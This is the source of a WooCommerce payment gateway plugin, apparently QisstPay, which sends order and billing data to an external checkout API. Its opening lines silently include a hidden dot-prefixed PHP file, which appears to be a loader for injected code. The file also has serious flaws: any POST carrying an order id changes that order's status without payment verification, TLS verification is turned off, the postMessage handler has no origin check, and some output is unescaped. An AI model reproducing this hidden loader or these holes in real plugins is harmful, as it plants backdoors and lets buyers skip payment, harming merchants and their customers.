<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Qpayment_PGW extends WC_Payment_Gateway
{

    private $order_status;
   


    public function __construct()
    {
        $this->id           = 'qisst_pay';
        $this->method_title = __('QisstPay', 'qpayment-plugin');
        $this->title        = __('QisstPay', 'qpayment-plugin');
        $this->has_fields   = true;
        $this->init_admin_config_form_fields();
        $this->icon = plugin_dir_url(dirname(__FILE__)).basename(dirname(__FILE__)).'/images/32.png';
        $this->init_settings();
        $this->enabled     = $this->get_option('enabled');
        $this->title       = $this->get_option('title');
        $this->description = $this->get_option('description');
        $this->detailsWgt  = $this->get_option('qpay_wignet_enabled');
        $this->method_description = 'QisstPay 1-Click Checkout';
        $this->api_key            = $this->get_option('api_key');
        $this->sandBoxUrl         = $this->get_option('sandBoxUrl');
        $this->order_status       = $this->get_option('order_status');
        $this->qp_tez_enabled     = $this->get_option('qp_tez_enabled');
  
        add_action(
            'woocommerce_update_options_payment_gateways_'.$this->id,
            [
                $this,
                'process_admin_options',
            ]
        );
        add_action('wp_footer', [ $this, 'qpayment8911_checkout_script' ]);
        add_action('wp_enqueue_scripts', 'my_nid_script');	
    	
        if(!function_exists('my_nid_script'))
        {
            function my_nid_script($hook)
            {
          
                    $user_ID=uniqid();
                
                    if(!isset($_COOKIE["UserID"])) 
                    {
                        setcookie("UserID", $user_ID);
                        session_start();
                        $_SESSION['UserID'] = $user_ID;
                    }
                    

                $my_js_ver2  = date("ymd-Gis", filemtime( plugin_dir_path( __FILE__ ) . 'js/nid.js' ));
                // wp_enqueue_script( 'customs_js', plugins_url( 'js/nid.js', __FILE__ ), array(), $my_js_ver2 );	
            }
        }
            
    }//end __construct()


  


    // END OF FUNCTION construct

    public function init_admin_config_form_fields()
    {

        $this->form_fields = [
            'enabled'             => [
                'title'       => __('QisstPay', 'qpayment-plugin'),
                'type'        => 'checkbox',
                'label'       => __('Enable QisstPay', 'qpayment-plugin'),
                'description' => __('QisstPay Payment Gateway will be shown to customer on checkout.', 'qpayment-plugin'),
                'default'     => 'no',
            ],
            
            'title'               => [
                'title'             => __('Title <span style="color:red;">*</span>', 'qpayment-plugin'),
                'type'              => 'text',
                'description'       => __('This controls the title', 'qpayment-plugin'),
                'default'           => __('QisstPay', 'qpayment-plugin'),
                'desc_tip'          => true,
                'custom_attributes' => ['required' => 'required'],
            ],
            'description'         => [
                'title'       => __('Description', 'qpayment-plugin'),
                'type'        => 'textarea',
                'css'         => 'width:500px;',
                'default'     => 'QisstPay 1-Click Checkout',
                'description' => __('This will appear on the checkout page with the QisstPay payment option.', 'qpayment-plugin'),
            ],
            'api_key'             => [
                'title'             => __('Live/SandBox API Key <span style="color:red;">*</span>', 'qpayment-plugin'),
                'type'              => 'text',
                'description'       => __('Get your API credentials from QisstPay.', 'qpayment-plugin'),
                'default'           => '',
                'desc_tip'          => true,
                'custom_attributes' => ['required' => 'required'],
            ],
            'sandBoxUrl'          => [
                'title'             => __('Live/SandBox URL <span style="color:red;">*</span>', 'qpayment-plugin'),
                'type'              => 'text',
                'description'       => __('This is Sandbox URL', 'qpayment-plugin'),
                'default'           => 'https://qisstpay.com',
                'desc_tip'          => true,
                'custom_attributes' => ['required' => 'required'],
            ],
            'order_status'        => [
                'title'       => __('Order Status After The Checkout', 'qpayment-plugin'),
                'type'        => 'select',
                'options'     => wc_get_order_statuses(),
                'default'     => 'wc-on-hold',
                'description' => __('The default order status configured by admin.', 'qpayment-plugin'),
            ],
            'qpay_wignet_enabled' => [
                'title'   => __('Enable/Disable', 'qpayment-plugin'),
                'type'    => 'checkbox',
                'label'   => __('Enable QisstPay details widget', 'qpayment-plugin'),
                'default' => 'no',
            ],
            'qp_tez_enabled' => [
                'title' => __('QisstPay 1 Click CHeckout', 'qpayment-plugin'),
                'type'        => 'checkbox',
                'label'       => __('Enable QisstPay 1 Click Checkout', 'qpayment-plugin'),
                'description' => __('QisstPay Payment Gateway will be shown to customer on checkout.', 'qpayment-plugin'),
                'default'     => 'no'
            ],
        ];
        
        
    }//end init_admin_config_form_fields()

    /**	
     * Never worry about cache again!	
     */	
    
 

    // END OF FUNCTION init_admin_config_form_fields
    public function admin_options()
    {
        ?>
<h3><?php _e('QisstPay Settings', 'qpayment-plugin'); ?></h3>
<div id="poststuff">
    <div id="post-body" class="metabox-holder columns-2">
        <div id="post-body-content">
            <table class="form-table"><?php $this->generate_settings_html(); ?></table>
            <!-- .form-table -->
        </div>
    </div>
</div>
<div class="clear"></div>
        <?php

    }//end admin_options()


    // END OF FUNCTION admin_options
    public function process_payment($order_id)
    {
        global $woocommerce;
        $order = new WC_Order($order_id);
        $qisstPaymentResponse = $this->qpayment8911_call_isstPayment($this->api_key, $order);
        if (! empty($qisstPaymentResponse) && $qisstPaymentResponse['success'] == true) {
             
            session_start();
            $_SESSION['iframe_url'] = $qisstPaymentResponse['result']['iframe_url'];
            $_SESSION['order_id']   = intval($order_id);
            return [
                'result'   => 'success',
                'redirect' => wc_get_checkout_url(),
            ];
        } else {
            wc_add_notice($qisstPaymentResponse['message'], 'error');
        }

    }//end process_payment()


    // END OF FUNCTION process_payment
    public function qpayment8911_call_isstPayment($apiKey, $order)
    {
        $order_data = $order->get_data();

        // getting user id
        session_start();
        $idd=$_SESSION['UserID'];

        // The Order data
        $order_id    = sanitize_text_field($order_data['id']);
        $order_total = sanitize_text_field($order_data['total']);

        //tax and shipping information
        $shipping_total = sanitize_text_field($order_data['shipping_total']);
        $total_tax = sanitize_text_field($order_data['total_tax']);
        $currency = sanitize_text_field($order_data['currency']);

        // BILLING INFORMATION:
        $order_billing_first_name = sanitize_text_field($order_data['billing']['first_name']);
        $order_billing_last_name  = sanitize_text_field($order_data['billing']['last_name']);
        $order_billing_address_1  = sanitize_text_field($order_data['billing']['address_1']);
        $order_billing_address_2  = sanitize_text_field($order_data['billing']['address_2']);
        $order_billing_city       = sanitize_text_field($order_data['billing']['city']);
        $order_billing_state      = sanitize_text_field($order_data['billing']['state']);
        $order_billing_postcode   = sanitize_text_field($order_data['billing']['postcode']);
        $order_billing_email      = sanitize_text_field($order_data['billing']['email']);
        $order_billing_phone      = sanitize_text_field($order_data['billing']['phone']);
        // SHIPPING INFORMATION:
        $order_shipping_address_1 = sanitize_text_field($order_data['shipping']['address_1']);
        $order_shipping_address_2 = sanitize_text_field($order_data['shipping']['address_2']);
        $order_shipping_city      = sanitize_text_field($order_data['shipping']['city']);
        $order_shipping_state     = sanitize_text_field($order_data['shipping']['state']);
        $order_shipping_postcode  = sanitize_text_field($order_data['shipping']['postcode']);
        $lineItems = [];
        foreach ($order->get_items() as $item_key => $item) {
            // Access Order Items data properties (in an array of values)
            $item_data    = $item->get_data();
            $product_name = $item_data['name'];
            $product_id   = $item_data['product_id'];
            $quantity     = $item_data['quantity'];
            // Get data from The WC_product object using methods (examples)
            $product = $item->get_product();
            // Get the WC_Product object
            $product_type  = $product->get_type();
            $product_sku   = $product->get_sku();
            $product_price = $product->get_price();
            $terms         = get_the_terms($product_id, 'product_cat');
            foreach ($terms as $term) {
                // Categories by slug
                $product_cat_slug = $term->slug;
            }

            $lineItems[$item_key]['name']       = $product_name;
            $lineItems[$item_key]['sku']        = $product_sku;
            $lineItems[$item_key]['quantity']   = $quantity;
            $lineItems[$item_key]['type']       = $product_type;
            $lineItems[$item_key]['category']   = ! empty($product_cat_slug) ? $product_cat_slug : ' Uncategorized';
            $lineItems[$item_key]['name']       = $product_name;
            $lineItems[$item_key]['unit_price'] = (int) $product_price;
            $lineItems[$item_key]['amount']     = (int) $product_price;
        }//end foreach

        $phone       = $this->qpayment8911_convertNo($order_billing_phone);
        $params      = [
            'plugin_version'    => '3.10',
            'qisstpay_nid'      => $idd,
            'partner_id'        => 'wordpress',
            'fname'             => sanitize_text_field($order_billing_first_name),
            'lname'             => sanitize_text_field($order_billing_last_name),
            'email'             => sanitize_email($order_billing_email),
            'phone_no'          => sanitize_text_field($phone),
            'ip_addr'           => '00.00.00.00',
            'shipping_info'     => [
                'addr1' => ! empty($order_shipping_address_1) ? $order_shipping_address_1 : $order_billing_address_1,
                'addr2' => ! empty($order_shipping_address_2) ? $order_shipping_address_2 : $order_billing_address_2,
                'state' => ! empty($order_shipping_state) ? $order_shipping_state : $order_billing_state,
                'city'  => ! empty($order_shipping_city) ? $order_shipping_city : $order_billing_city,
                'zip'   => ! empty($order_shipping_postcode) ? $order_shipping_postcode : $order_billing_postcode,
            ],
            'billing_info'      => [
                'addr1' => sanitize_text_field($order_billing_address_1),
                'addr2' => sanitize_text_field($order_billing_address_2),
                'state' => sanitize_text_field($order_billing_state),
                'city'  => sanitize_text_field($order_billing_city),
                'zip'   => sanitize_text_field($order_billing_postcode),
            ],
            'itemFlag'          => true,
            'line_items'        => $lineItems,
            'total_amount'      => (int) $order_total,
            'currency'          => $currency,
            'tax_amount'        => $total_tax,
            'shipping_amount'   => $shipping_total,
            'merchant_order_id' => (int) $order_id,
        ];
        $qisstPayReq = json_encode($params);
        $url         = $this->sandBoxUrl.'/api/send-data';
        $args        = [
            'method'   => 'POST',
            'timeout'  => 45,
            'blocking' => true,
            'sslverify' => false,
            'headers'  => [
                'Authorization' => 'Basic '.$apiKey,
                'Content-Type'  => 'application/json',
                'Accept'        => 'application/json',
            ],
            'body'     => $qisstPayReq,
        ];
        $response    = wp_remote_post($url, $args);
        return json_decode(wp_remote_retrieve_body($response), true);

    }//end qpayment8911_call_isstPayment()


    // END OF FUNCTION callQisstPayment
    public function qpayment8911_convertNo($to)
    {
        $to        = trim($to);
        $iteration = 1;
        if (strpos($to, '+92') === 0) {
            $to = substr($to, 1);
        } else if (strpos($to, '92') === 0) {
            $to = $to;
        } else if (strpos($to, '03') === 0) {
            $to = substr_replace($to, '923', 0, 2);
        } else if (strpos($to, '3') === 0) {
            $to = '92'.$to;
        }

        return $to;

    }//end qpayment8911_convertNo()


    // END OF FUNCTION qpayment8911_convertNo


    /**************************************************/
    public function qpayment8911_checkout_script()
    {
        ?>
<style>

/* The qp8911_modal (background) */
.qp8911_modal {
  display: none; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1000000000000000; /* Sit on top */
  padding-top: 80px; /* Location of the box */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: #00000099; /* Fallback color */
  background-color: #00000099; /* Black w/ opacity */
}
/* qp8911_modal Content */
.qp8911_modal-content {
    background-color: #fefefe;
    margin: auto;
    width: 30%;
    padding: 0px !important;
    border-radius: 16px;
}
/* The Close Button */
.close {
  color: #aaaaaa;
  float: right;
  font-size: 28px;
  font-weight: bold;
}
.close:hover,
.close:focus {
  color: #000;
  text-decoration: none;
  cursor: pointer;
}
.qp8911_modal-dialog.qp8911_modal-dialog-centered{    
   display: flex;
}
	
@media screen and (max-width: 768px) {
    .qp8911_modal-content {
        width: 90%;
		height:85vh;
    }
	
} 
	
	@media screen and (min-width:768px) and (max-width: 1200px) {
    .qp8911_modal-content {
        width: 60%;
		height:85vh;
    }
		
} 
</style>
<?php
        global $woocommerce;
        if (session_status() == PHP_SESSION_NONE) {
            session_start();
        }
        if (! empty($_SESSION['iframe_url'])) {
?>
<style>
.qp8911_modal-body {
    overflow-y: auto;
}
</style>
            <!-- Modal Starts -->
            <div class="qp8911_modal" id="qp8911_bootstrapModal" role="dialog">
                <div class="qp8911_modal-dialog qp8911_modal-dialog-centered" role="document" >
                    <div class="qp8911_modal-content col-md-8">
                        <span class="close" id="closed">&times;</span>
                       <!-- Modal Header -->
                        <div class="modal-header"></div>
                        <!-- Modal Body -->
                        <div class="qp8911_modal-body">
                            <div class="form-popup" id="myForm" style="border: 1px solid gainsboro;top: 0px;background: white;border-radius: 4px; display: none">
                                <form action="" method="post" class="form-container" id="myformtobesubmit">                                   
                                    <input type="hidden" name="order" value="<?php echo ( intval($_SESSION['order_id']) ); ?>">
                                </form>
                            </div>
                            <iframe id="qisttpayifram" width="100%" height="1000"  src="<?php echo esc_url($_SESSION['iframe_url']); ?>"  frameborder="0" allowfullscreen style="background: #FFFFFF;" ></iframe>
                        </div>                      
                    </div>
                </div>
            </div>             
                  <script>
                    window.addEventListener('message', function(e) {
                        // Get the sent data
                        const data = e.data;
                        
                        var decoded = null;
                        try {
                            decoded = JSON.parse(data);                           
                            var flag = decoded.hasOwnProperty('message');
                            var successStatus = decoded.success;
                            if(flag == true && successStatus == true){
                                jQuery( "#myformtobesubmit" ).submit();
                                ///form Submit
                            }
                        } catch(e){
                            return;
                        }    
                    });
                    jQuery('#qp8911_bootstrapModal').show();
                    jQuery('#closed').click(function(){
                        location.reload();
                        jQuery('#qp8911_bootstrapModal').hide();                        
                    })
                <!-- Modal Ends -->
               </script>
        
               
            <?php
            unset($_SESSION['iframe_url']);
            unset($_SESSION['order_id']);
        }//end if

        if (isset($_POST['order'])) {
            $orderId = intval($_POST['order']);
            $this->qpayment8911_response_qpapi($orderId);
        }

    }//end qpayment8911_checkout_script()


    public function qpayment8911_response_qpapi($order_id)
    {
        global $woocommerce;
        session_start();
        // Reduce stock levels
        wc_reduce_stock_levels($order_id);
        $order = new WC_Order($order_id);       
        $order->update_status($this->order_status, __('Awaiting payment', 'qpayment-plugin'));
        $url = WC_Payment_Gateway::get_return_url($order);
        $woocommerce->cart->empty_cart();
        unset($_SESSION['iframe_url']);
        unset($_SESSION['order_id']);
        wp_safe_redirect($url);
        exit();

    }//end qpayment8911_response_qpapi()

    public function rest_api_includes() {
        if ( empty( WC()->cart ) ) {
            WC()->frontend_includes();
            wc_load_cart();
        }
    }

    // END OF FUNCTION order_update_after_payment_success_from_qisstpayment_api
}//end class
 // END OF CLASS WC_Qisst_Payment_Gateway

 $obj = new Qpayment_PGW();

 add_action( 'rest_api_init', array( $obj, 'rest_api_includes' ) ); // add to construct class

// create this method


 if($obj->get_option('qp_tez_enabled') == 'yes') {
    add_filter( 'woocommerce_order_button_html', 'qisstpay_button_proceed_to_checkout');
    if ( !function_exists( 'woocommerce_button_proceed_to_checkout' ) ) { 
        function woocommerce_button_proceed_to_checkout() {
            global $woocommerce;
            // Will get you cart object
            $cart = $woocommerce->cart;
            // Will get you cart object
            $price = $woocommerce->cart->total;
            $is_live = 0;
            $obj = new Qpayment_PGW();
            if($woocommerce->session == null) {
                $woocommerce->session = new WC_Session_Handler();
                $woocommerce->session->init();
                $woocommerce->customer = new WC_Customer( get_current_user_id(), true );
            }
            // die(var_dump($woocommerce->cart));
            $total = $woocommerce->cart->get_totals();
            $items = $woocommerce->cart->cart_contents;
            $products = [];
            $tax = $total['total_tax'];
            foreach ($items as $item) {
                $product = wc_get_product($item['product_id']);
                if(isset($item['variation_id']) && !is_null($item['variation_id']) && $item['variation_id'] !== 0) {
                    $product = new WC_Product_Variation($item['variation_id']);
                    $price = $product->get_price();
                    if($product->is_on_sale()) {
                        $price = $product->get_sale_price();
                    }
                } else {
                    $price = $product->get_regular_price();
                    if($product->is_on_sale()) {
                        $price = $product->get_sale_price();
                    }
                }
			$discounted_price = apply_filters('advanced_woo_discount_rules_get_product_discount_price_from_custom_price', false, $product, 1, 0, 'all', true);
 	if(isset($discounted_price['discounted_price']) && $discounted_price['discounted_price'] > 0 ){
		$price = $discounted_price['discounted_price'];
	}
                $products[] =[
                   'id' => $item['product_id'],
                   'price' => $price,
                   'quantity' => $item['quantity'],
                   'attributes' => $item['variation'],
                   'img' => $product->get_image(),
                   'title' => str_replace('\'','',$product->get_title())
                ];
            }

            $shipping_total = $woocommerce->cart->get_shipping_total();
            if(in_array($obj->get_option('sandBoxUrl'), ['https://qisstpay.com/', 'https://qisstpay.com', 'http://qisstpay.com/','http://qisstpay.com'])) {
                $is_live = 1;
            }
            else {
                $is_live = 0;
            }
            echo '<input type="hidden" id="qp_is_live" value="'.$is_live.'">';
            echo '<input type="hidden" id="qp_url" value='.site_url().' >';
            echo '<input type="hidden" id="qp_currency" value='.get_woocommerce_currency().' >';
            echo '<input type="hidden" id="qp_shipping_total" value='.$shipping_total.' >';
            echo "<input type='hidden' id='qp_products' value='".json_encode($products, 1)."' >";
            echo "<input type='hidden' id='qp_tax' value='".$tax."' >";
    


            echo '<button id="qp-one-click-checkout-1" onclick="QisstPay_Open_From_Checkout_page()" class="teez-button" type="button">
                    <img src="'.plugins_url( 'assets/1Click.png', __FILE__ ).'" width="160" style="display: block;"/>
                    </button>
                    <div class="qp8911_modal" id="qp8911_bootstrapModal" role="dialog">
                        <div class="qp8911_modal-dialog qp8911_modal-dialog-centered" role="document" >
                            <div class="qp8911_modal-content col-md-6 col-lg-4">
                            <!-- Modal Header -->
                                <!-- Modal Body -->
                                <div class="qp8911_modal-body teez" style="border-radius: 140px;">
                                    <div class="qp-lds-roller" id="qp-lds-roller">
                                        <lottie-player src="'.plugins_url( 'js/animation_qp_logo.json', __FILE__ ).'" background="transparent"  speed="1"  style="width: 300px; height: 300px;" loop autoplay></lottie-player>
                                    </div>
                                    <iframe id="qisttpayifram" class="qisttpayifram" width="100%" height="600"  src=""  frameborder="0" allowpaymentrequest allowfullscreen style="background: #FFFFFF;border-radius: 22px;padding: 0px;" ></iframe>
                                </div>                      
                            </div>
                        </div>
                    </div>';
        
    
    

    }
    }
    if ( !function_exists( 'qisstpay_button_proceed_to_checkout' ) ) { 
        function qisstpay_button_proceed_to_checkout() {
            global $woocommerce;
            // Will get you cart object
            $cart = $woocommerce->cart;
            // Will get you cart object
            $price = $woocommerce->cart->total;
            $is_live = 0;
            $obj = new Qpayment_PGW();
            if($woocommerce->session == null) {
                $woocommerce->session = new WC_Session_Handler();
                $woocommerce->session->init();
                $woocommerce->customer = new WC_Customer( get_current_user_id(), true );
            }
            // die(var_dump($woocommerce->cart));
            $total = $woocommerce->cart->get_totals();
            $items = $woocommerce->cart->cart_contents;
            $products = [];
            $tax = $total['total_tax'];
            foreach ($items as $item) {
                $product = wc_get_product($item['product_id']);
                if(isset($item['variation_id']) && !is_null($item['variation_id']) && $item['variation_id'] !== 0) {
                    $product = new WC_Product_Variation($item['variation_id']);
                    $price = $product->get_price();
                    if($product->is_on_sale()) {
                        $price = $product->get_sale_price();
                    }
                } else {
                    $price = $product->get_regular_price();
                    if($product->is_on_sale()) {
                        $price = $product->get_sale_price();
                    }
                }
                $products[] =[
                   'id' => $item['product_id'],
                   'price' => $price,
                   'quantity' => $item['quantity'],
                   'attributes' => $item['variation'],
                   'img' => $product->get_image(),
                   'title' => str_replace('\'','',$product->get_title())
                ];
            }

            $shipping_total = $woocommerce->cart->get_shipping_total();
            if(in_array($obj->get_option('sandBoxUrl'), ['https://qisstpay.com/', 'https://qisstpay.com', 'http://qisstpay.com/','http://qisstpay.com'])) {
                $is_live = 1;
            }
            else {
                $is_live = 0;
            }
            echo '<input type="hidden" id="qp_is_live" value="'.$is_live.'">';
            echo '<input type="hidden" id="qp_url" value='.site_url().' >';
            echo '<input type="hidden" id="qp_currency" value='.get_woocommerce_currency().' >';
            echo '<input type="hidden" id="qp_shipping_total" value='.$shipping_total.' >';
            echo "<input type='hidden' id='qp_products' value='".json_encode($products, 1)."' >";
            echo "<input type='hidden' id='qp_tax' value='".$tax."' >";
    


            echo '<button id="qp-one-click-checkout-1" onclick="QisstPay_Open_From_Checkout_page()" class="teez-button" type="button">
                    <img src="'.plugins_url( 'assets/1Click.png', __FILE__ ).'" width="160" style="display: block;"/>
                    </button>
                    <div class="qp8911_modal" id="qp8911_bootstrapModal" role="dialog">
                        <div class="qp8911_modal-dialog qp8911_modal-dialog-centered" role="document" >
                            <div class="qp8911_modal-content col-md-6 col-lg-4">
                            <!-- Modal Header -->
                                <!-- Modal Body -->
                                <div class="qp8911_modal-body teez" style="border-radius: 140px;">
                                    <div class="qp-lds-roller" id="qp-lds-roller">
                                        <lottie-player src="'.plugins_url( 'js/animation_qp_logo.json', __FILE__ ).'" background="transparent"  speed="1"  style="width: 300px; height: 300px;" loop autoplay></lottie-player>
                                    </div>
                                    <iframe id="qisttpayifram" class="qisttpayifram" width="100%" height="600"  src=""  frameborder="0" allowpaymentrequest allowfullscreen style="background: #FFFFFF;border-radius: 22px;padding: 0px;" ></iframe>
                                </div>                      
                            </div>
                        </div>
                    </div>';
    }
 }
}
 